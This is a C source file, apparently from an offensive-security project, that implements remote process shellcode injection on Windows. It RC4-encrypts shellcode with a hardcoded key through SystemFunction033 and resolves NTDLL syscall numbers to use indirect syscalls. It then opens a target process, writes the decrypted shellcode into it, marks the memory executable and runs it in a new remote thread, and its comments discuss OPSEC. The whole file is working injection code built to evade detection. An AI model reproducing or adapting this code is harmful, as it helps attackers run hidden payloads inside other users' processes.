#include "Box.h"


/*--------------------------------------------------------[RC4 Encryption]----------------------------------------------------*/


BOOL EncryptRC4(
	_In_ CONST PBYTE pShellcode,
	_In_ CONST SIZE_T sSizeofShellcode
)
{

	NTSTATUS STATUS = NULL;

	BYTE _key[] = { 0xDE,0xAD,0xBE,0xEF }; // key used to decrypt and encrypt shellcode

	// ensure everything is working
	if (!pShellcode || sSizeofShellcode == 0) {
		WARN("EncryptRC4_SystemFunc: invalid params");
		return FALSE;
	}

	DATA_BLOB data_blob = { .cbData = (DWORD)sSizeofShellcode, .pbData = pShellcode };
	DATA_BLOB key_blob = { .cbData = (DWORD)sizeof(_key), .pbData = _key };

	// SystemFunction033 from advapi32
	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
	if (!SystemFunction033) {
		WARN("GetProcAddress(SystemFunction033) failed");
		return FALSE;
	}

	if ((STATUS = SystemFunction033(&data_blob, &key_blob)) != 0x0)
	{
		printf("[!] SystemFunction033 FAILED With Error : 0x%0.8X\n", STATUS);
		return FALSE;
	}


	for (DWORD i = 0; i < data_blob.cbData; i++)
	{
		if (i % 16 == 0) printf("\n ");
		Sleep(1);
		printf(" %02x", data_blob.pbData[i]);
	}



	printf("\nCurrent RC4 Encrypted Shellcode Address: %p\n", (void*)data_blob.pbData);

	return TRUE;
}


/*-------------------------------------------------------[GetProcAddress ALternative]---------------------------------------------------*/


VOID IndirectPrelude(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN, OUT PUINT_PTR FuncSys)
{

	/*
	
		Something to note for this function, as of right now
		this function will use GetProcAddress and we will also
		use LoadLibrary in the next function.

		In terms of OPSEC, this is malpractice, and should be switched
		to a custom function.

		For the sake of simplicity it will say like this, but in future
		project, there will be a custom SSN retriver and PE module loader
	
	*/


	DWORD SyscallNumber = 0;

	UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };

	UINT_PTR NtFunctionAddress = 0;

	NtFunctionAddress = (UINT_PTR)GetProcAddress(mod, FuncName);
	if (NtFunctionAddress == 0)
	{
		WARN("GetProcAddress Failed! With an Error: %ld", GetLastError());
		return;
	}

	BYTE byte4 = ((PBYTE)NtFunctionAddress)[4];
	BYTE byte5 = ((PBYTE)NtFunctionAddress)[5];
	*FuncSSN = (byte5 << 8) | byte4;

	*FuncSys = NtFunctionAddress + 0x12;


	if (memcmp(SyscallOpcodes, (PVOID)*FuncSys, sizeof(SyscallOpcodes)) == 0) {
		INFO("[0x%p] [0x%p] [0x%0.3lx] -> %s", (PVOID)NtFunctionAddress, (PVOID)*FuncSys, *FuncSSN, FuncName);
		return;
	}

	else {
		WARN("expected syscall signature: \"0x0f05\" didn't match.");
		return;
	}


	/*
	
		courtesy of Crr0ww for this function, however
		in the future it will be better to not use these
		when calling the Syscalls :)
	
	*/


}


/*-----------------------------------------------------[Direct Syscalls]------------------------------------------------------*/


BOOL NtShellInjection(
	_In_ CONST DWORD PID,
	CONST PBYTE pEncryptedShellcode,
	_In_ CONST PBYTE pShellcode,
	_In_ CONST SIZE_T sSizeofShellcode
)

{


	NTSTATUS		STATUS = NULL;
	HANDLE		  hProcess = NULL;
	HANDLE		   hThread = NULL;
	PVOID		   rBuffer = NULL;
	DWORD			   TID = NULL;
	BOOL             State = TRUE;
	HMODULE    NtdllHandle = NULL;
	DWORD       OldProtection = 0;
	SIZE_T       BytesWritten = 0;
	SIZE_T origSize = sSizeofShellcode;
	SIZE_T regionSize = sSizeofShellcode;
	CLIENT_ID CID = { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);


	NtdllHandle = GetModuleHandleW(L"NTDLL");
	if (NULL == NtdllHandle) {
		WARN("GetModuleHandleW", GetLastError());
		return FALSE;
	}
	OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);


	/*-------------------------------------[Externally calling all function from DirectSyscalls.asm]-------------------------------------------------------*/


    IndirectPrelude(NtdllHandle, "NtOpenProcess", &g_NtOpenProcessSSN, &g_NtOpenProcessSyscall);
    IndirectPrelude(NtdllHandle, "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN, &g_NtAllocateVirtualMemorySyscall);
    IndirectPrelude(NtdllHandle, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN, &g_NtWriteVirtualMemorySyscall);
    IndirectPrelude(NtdllHandle, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN, &g_NtProtectVirtualMemorySyscall);
    IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall);
    IndirectPrelude(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN, &g_NtWaitForSingleObjectSyscall);
    IndirectPrelude(NtdllHandle, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN, &g_NtFreeVirtualMemorySyscall);
    IndirectPrelude(NtdllHandle, "NtClose", &g_NtCloseSSN, &g_NtCloseSyscall);
	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");



	STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtOpenProcess Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Got a handle to the process: [%ld]", hProcess, PID);

	// allocate SizeofShellcode to VirtualMemory
	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Allocated %zu Bytes to Virtual Memory!", sSizeofShellcode);


	/*---------------------------------------------------------------[Decrypting RC4 Shellcode]---------------------------------------------*/


	// Used to decrypt Shellcode
	PUCHAR localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, sSizeofShellcode);
	if (!localBuf) {
		WARN("HeapAlloc failed for localBuf");
		HeapFree(GetProcessHeap(), 0, localBuf);
		localBuf = NULL;
		State = FALSE;
	}
	RtlCopyMemory(localBuf, pEncryptedShellcode, sSizeofShellcode);


	DATA_BLOB data_local = { .cbData = (DWORD)sSizeofShellcode, .pbData = localBuf };


	BYTE local_key_bytes[] = { 0xDE, 0xAD, 0xBE, 0xEF };
	DATA_BLOB key_local = { .cbData = (DWORD)sizeof(local_key_bytes), .pbData = local_key_bytes };


	if ((STATUS = SystemFunction033(&data_local, &key_local)) != 0x0)
	{
		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	OKAY("Successfully Decrypted RC4!");


	/*------------------------------------------------------------------------[Writing Shellcode to Virtual Memory]-----------------------------------------------------------*/


	// Write the newly decrypted shellcode inside
	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, localBuf, origSize, &BytesWritten);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Wrote %zu Bytes to the Virtual Memory!", BytesWritten);

	// change permissions
	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &OldProtection);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Changed Allocation Protection from [RW] to [RX]");

	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtCreateThreadEx Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Created a Thread!", hThread);
	INFO("Waiting for Thread to finish executing...");
	STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
	INFO("Execution Completed! Cleaning Up!");




CLEANUP:


	if (rBuffer) {
		STATUS = NtFreeVirtualMemory(hProcess, &rBuffer, &sSizeofShellcode, MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS) {
			WARN("NtFreeVirtualMemory", STATUS);
		}
		else {
			INFO("[0x%p] decommitted allocated buffer from process memory", rBuffer);
		}
	}

	if (hThread) {
		NtClose(hThread);
		INFO("[0x%p] handle on thread closed", hThread);
	}

	if (hProcess) {
		NtClose(hProcess);
		INFO("[0x%p] handle on process closed", hProcess);


	}
}